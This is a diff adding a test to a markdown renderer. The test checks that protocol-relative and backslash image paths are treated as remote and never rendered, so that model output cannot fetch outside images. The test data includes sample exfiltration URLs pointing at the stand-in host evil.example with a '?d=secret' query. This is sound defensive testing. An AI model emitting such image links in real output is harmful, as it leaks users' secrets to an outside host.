@@ -154,6 +154,17 @@ test('by default a remote image never becomes an <img>: model output cannot fetc
   assert.match(quoted, /\[image: a &quot;b&quot; &lt;c&gt; — h\.example, not loaded\]/);
 });
 
+test('protocol-relative and backslash paths are remote, not same-origin', () => {
+  // A browser resolves //host and /\\host to another origin; only a single
+  // leading slash stays on this one.
+  for (const src of ['//evil.example/p.png?d=secret', '/\\evil.example/p.png?d=secret']) {
+    const html = renderMarkdownHtml(`![leak](${src})`);
+    assert.doesNotMatch(html, /<img/, src);
+    assert.match(html, /\[image: leak — evil\.example, not loaded\]/, src);
+  }
+  assert.match(renderMarkdownHtml('![ok](/img/x.png)'), /<img src="\/img\/x\.png"/);
+});
+
 test('remote-image permission lasts for one render only', () => {
   assert.match(renderMarkdownHtml('![a](https://ex.com/y.png)', { remoteImages: true }), /<img/);
   assert.doesNotMatch(renderMarkdownHtml('![a](https://ex.com/y.png)'), /<img/);
